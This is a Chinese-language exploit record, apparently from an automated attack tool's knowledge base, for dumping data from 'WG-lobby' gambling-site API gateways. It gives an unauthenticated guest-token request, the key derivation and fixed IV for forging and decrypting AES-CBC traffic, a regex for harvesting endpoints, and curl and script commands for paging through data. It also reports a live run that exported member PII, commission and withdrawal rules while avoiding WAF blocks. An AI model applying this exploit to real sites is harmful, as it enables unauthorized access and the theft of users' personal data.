# WG-lobby 游客 token 数据面拖库（getSysInfo 取 token + chipher 重放 + 响应解密 + 接口普查翻页）

- **code**: wg-lobby-游客-token-数据面拖库-getsysinfo-取-token-chipher-重放-响应解密-接口普查翻页
- **kind**: exp
- **category**: unauthorized
- **component**: WG-lobby（WG娱乐城前端+Go 网关，/hall/api/*）
- **source**: self
- **verified**: 1
- **verified_note**: 2026-09-27 在 203.0.113.27/hall（澳门新葡京 siteCode=3080）实测：151 发分类扫描 36 命中、89 业务数据接口可达，导出站点消息 49 条/活动配置 85 条/提现规则 144 字段/佣金 15 条/会员账号 PII 15 个，明文 73 文件约 1MB（runs/data/）。0 次 WAF 拦截（650ms 限速）。
- **tags**: wg-lobby,未授权,数据拖库,游客token,AES-CBC,翻页
- **created_at**: 2026-09-27T16:56:12.163Z
- **found_by**: exploit

## 描述

WG-lobby 系站点（config_data.json 下发 api_domain、commonChunk 主包、x-data-mode 三编码）游客级数据面拖库三步：① GET /hall/api/gohal/getSysInfo?siteCode=<SC> 未授权取得设备 token；② 25 字段设备 header + x-data-mode: chipher（body=AES-128-CBC(ZeroPadding), key=md5(token+md5(token)).slice(2,18), iv=5421698523412578）重放任意 POST 接口，plain 模式部分接口也受理；③ 响应为同密钥 AES-CBC base64，PKCS7 剥除即明文。接口全集从 7 个 JS bundle 提取 url:"/api/..." 字面量（能从 239 扩到 380）。数据类接口按 type/page 翻页（message/list/all 的 type=1/2/3/4/99 枚举），列表接口错误码分层定位参数（41070 参数异常→41050 解析包异常→code:1 成功）。

## 用法

```
node -e（或引用目标机脚本）：curl -sk "https://HOST/hall/api/gohal/getSysInfo?siteCode=SC" -H 'x-data-mode: plain' → token；node wg-post.js <path> '<json>' chipher 重放（含 25 header）；node wg-decrypt.js <resp.b64> <token> 解密。翻页：GET /hall/api/message/list/all?page=N&type=1&xdevice=1-1&siteCode=SC 直至与首页相同（该站 page 参数无效=一次全量）。7 个 bundle 提取：regex /["'`](\/api\/[A-Za-z0-9_\/.-]+)["'`]/g。
```
